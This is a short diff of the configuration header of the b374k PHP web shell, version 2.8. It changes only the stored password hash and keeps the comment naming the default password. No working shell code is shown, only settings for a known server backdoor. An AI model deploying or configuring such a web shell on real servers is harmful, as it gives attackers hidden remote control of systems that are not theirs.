@@ -6,7 +6,7 @@
 	http://code.google.com/p/b374k-shell
 
 */
-$s_pass = "4be1ab19f35868b70e5e2cbcffb81631f2ab79c6"; // default password : b374k (login and change to new password)
+$s_pass = "a626ebf1a51650bf323667b13603a627dec3819c"; // default password : b374k (login and change to new password)
 
 $s_ver = "2.8"; // shell ver
 $s_title = "b374k ".$s_ver; // shell title
